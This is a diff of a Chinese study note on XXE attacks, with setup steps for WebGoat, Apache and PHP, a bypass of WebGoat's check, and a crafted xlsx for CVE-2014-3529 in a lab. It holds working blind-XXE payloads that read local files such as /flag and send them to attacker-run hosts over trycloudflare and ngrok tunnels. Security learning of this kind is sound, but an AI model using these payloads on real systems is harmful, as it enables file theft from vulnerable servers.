@@ -1,28 +1,10 @@
 # 环境
 ## WebGoat 搭建  
-1. 
 安装docker,使用以下命令  
 ```bash
 docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat
 ```  
 
-
-2. 
-https://github.com/WebGoat/WebGoat/releases/download/v2025.3/webgoat-2025.3.jar  
-
-
-3. 使用源码搭建  
-
-- 下载源码  
-```
-git clone https://github.com/WebGoat/WebGoat.git
-``` 
-进入，在当前目录打开pom.xml文件，找到java.version标签，把java版本修改为自己的java版本。 使用管理员权限，执行  
-```bash
-./mvnw.cmd clean install
-```  
-~/.m2/repository/org/eclipse/jgit/org.eclipse.jgit
-cd ~/.m2/repository/org/apache/pdfbox/pdfbox/2.0.24  
 
 ## php和Apache httpd  
 httpd下载连接  
@@ -30,16 +12,17 @@ httpd下载连接
 https://www.apachelounge.com/download/ 
 ```  
 解压缩之后有一个叫Apache24的文件夹，如果移动到其他地方，需要自己修改配置，如果直接放在C盘，就不需要再修改配置。  
-配置文件是Apache24/config/httpd.conf,找到图中内容，把路径修改为自己的路径  
-在Apache24/bin目录双击运行ApacheMoniter.exe  
-![alt text](image.png)  
-![alt text](image-1.png)  
-如果没有打开，左键单击图标可以开启  
-![alt text](image-2.png)
-如果左键没有反应，右键单击，打开open servers,看到Apache2.4,就开启他  
+配置文件是Apache24/config/httpd.conf  
+服务器的根目录  
+```conf  
+Define SRVROOT "c:/Apache24"
+```  
+监听的端口，可以通过这个端口访问服务  
+```conf
+Listen 80
+```  
 
-启动成功后访问localhost，页面应该和Apache24/htdocs/index.html一样  
-![alt text](image-3.png)  
+在bin目录下运行httpd就可以开启服务了  
 
 php下载连接 
 ```
@@ -48,7 +31,7 @@ https://www.php.net/downloads.php
 选择一个版本，点击Windows downloads，
 ![alt text](image-4.png)  
 
-有很多，比如这里有两个，上面是Non Thread Safe,下面是Thread Safe,下载Thread Safe的，解压之后放好  
+上面是Non Thread Safe,下面是Thread Safe,下载Thread Safe的，解压之后放好  
 
 打开Apache24/conf/httpd.conf文件，在合适的地方添加下面内容，文件内有很多标签，不要加在标签内部就可以了。文件路径该为自己php的路径。  
 ```
@@ -101,6 +84,7 @@ XML实体在DTD中被声明，用于代替内容或标记。
 第七页，因为现代REST框架，服务器可能会处理开发者没有考虑的情况，这里请求体使用json格式，但是服务端仍然可以处理xml格式的信息，所以conten-type之后采用同样的方式攻击  
 修改两处，一个是Content-Type，修改成如图内容，一个是修改请求体，修改内容和上一题一样  
 
+## XXE DOS
 
 ## blind xxe  
 
@@ -171,9 +155,10 @@ fclose($file);
 ```xml
 <!ENTITY % send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>
 ```  
-那么test中的内容将是字符串"%file;"  
+那么test.txt中的内容将是字符串"%file;"  
+xml解析器时只对实体的值解析，SYSTEM后面的字符串作为资源路径不被解析，嵌套后SYSTEM作为字符串不被识别为关键字，解析器将后面的实体展开  
 
-2. 实体int通过外部DTD定义，这是由于xml解析器在解析内部内部实体时，对展开的内容不作二次解析，而会对外部实体展开内容再次解析如果使用下面的方式  
+2. 实体int通过外部DTD定义，这是由于xml解析器在解析内部实体时，对展开的内容不作二次解析，而会对外部实体展开内容再次解析，如果使用下面的方式  
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE comment[
@@ -185,9 +170,9 @@ fclose($file);
 <text>hello</text>
 </comment>
 ```  
-est.txt的内容不会发生变化，因为send没有被定义，没有发出请求  
+test.txt的内容不会发生变化，因为send没有被定义，没有发出请求  
 
-3. send并不一定需要是参数，也可以是通用实体，用如下方式也可以得到目标内容  
+3. send并不一定需要是参数实体，也可以是通用实体，用如下方式也可以得到目标内容  
 kk.txt  
 ```xml
 <!ENTITY % int "<!ENTITY send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>">
@@ -205,6 +190,7 @@ kk.txt
 <text>hello&send;</text>
 </comment>  
 ```  
+参数实体和通用实体有两个明显的区别，参数实体一般只在dtd内部使用，引用时使用%，通用实体一般只在xml部分（不能在dtd内），引用时使用&
 
 
 - 还有一个简单的绕过方法，构造请求体如下  
@@ -219,19 +205,22 @@ kk.txt
 ![alt text](image-14.png)  
 因为服务端检验的逻辑是，首先判断请求体的原始数据有没有包含secret的内容，只要有就通过  
 如果没有就xml解析，展开实体，但是作者写成secret的内容是否包含了text标签的内容，所以随便加点就可以绕过
-关键代码如下，完整代码的位置在WebGoat\src\main\java\org\owasp\webgoat\lessons\xxe  
+关键代码如下，完整代码的位置在WebGoat\src\main\java\org\owasp\webgoat\lessons\xxe，源码在github上可以下载  
 ```java  
  if (commentStr.contains(fileContentsForUser)) {
+    /*
+     * commentStr是请求体的原始数据，是xml格式的数据，是String类
+     * fileContentsForUser是为用户生成的secret内容，也是String类
+     * 如果commentStr包含secret的内容，就正确
+     */
       return success(this).build();
     }
-    /*
-     * commentStr是请求体的原始数据，是xml格式的数据，是String类，如果包含secret的内容，就正确
-     * fileContentsForUser是为用户生成的secret内容
-     */
+    
 
     try {
       /*
        * comments是一个CommentsCache类,管理评论区的内容
+       * parseXml解析原始xml数据，返回评论的内容
        * false表示不启用安全模式，运行使用外部实体
        * comments解析请求体返回一个Comment类
        * 如果解析后的内容属于secret的一部分，就修改请求
@@ -245,7 +234,53 @@ kk.txt
     } catch (Exception e) {
       return failed(this).output(e.toString()).build();
     }
-```
+```  
+
+如果目标主机不在本地，可以使用内网穿透等方式。  
+作者使用内网穿透的方式，有很多工具可以实现，比如ngrok,Tunnelblick,cloudflared等等，作者对于这些工具了解不多，但仅从完成xxe的角度来说，作者认为cloudflared是免费，操作简单，稳定的。  
+在https://github.com/cloudflare/cloudflared/releases/tag/2025.2.1下载  
+开启http服务后，使用命令  
+```bash
+.\cloudflared.exe tunnel --url http://localhost:80
+```  
+![alt text](image-15.png)  
+框框内就是新的url  
+准备好之后立刻继续  
+
+## 其他情景xxe攻击  
+
+xml不仅可以作为请求体的结构，有些应用程序的配置文件也采用xml格式，程序会因为标签的属性或内容不同而产生不同的效果，比如webgoat的配置文件就是pom.xml,其中java.version标签指明了使用的java版本。  
+excel表实质上是一个压缩包，大量使用了xml格式的文件来存储信息。解压的内容如下  
+![](image-21.png)  
+[Content_Types].xml是主要的配置文件，excel解析时触发xxe的关键文件  
+
+###  CVE-2014-3529  
+
+这是一个基于解析excel的漏洞  
+本地环境仍然开启http服务，开启内网穿透，同样需要get.php和kk.txt,将url修改为cloudflared提供的url  
+在https://yunjing.ichunqiu.com/cve/detail/1013?pay=2轻松漏洞环境  
+打开时下面的样子  
+![alt text](image-16.png)  
+
+新建一个空的xlsx文件，也就是excel表  
+![alt text](image-17.png)  
+修改后缀为zip，解压  
+![alt text](image-18.png)  
+打开xml文件  修改为如下内容,和原文件相比，仅仅添加dtd部分    
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE ANY [ 
+<!ENTITY % file SYSTEM "file:///flag"> 
+<!ENTITY % dtd SYSTEM "https://tile-agency-dana-cartridge.trycloudflare.com/kk.txt">
+%dtd; %all;%send;]>
+
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>
+```  
+压缩，将压缩包后缀改为xlsx，选择该文件并上传，上传后跳转如下页面，复制文件名，返回解析  
+![alt text](image-19.png)  
+查看本地test.txt文件  
+![alt text](image-20.png)  
+
 
 
 # 几个XXE题目  
@@ -322,3 +357,10 @@ for i in range(1,256):
 可以找到  
 ![alt text](image-24.png)  
 
+```xml
+<!DOCTYPE convert [
+<!ENTITY % remote SYSTEM "http://917a-240e-604-38d-00-659-f694.ngrok-free.app/kk.txt">
+%remote;%int;%send;
+]>
+
+```
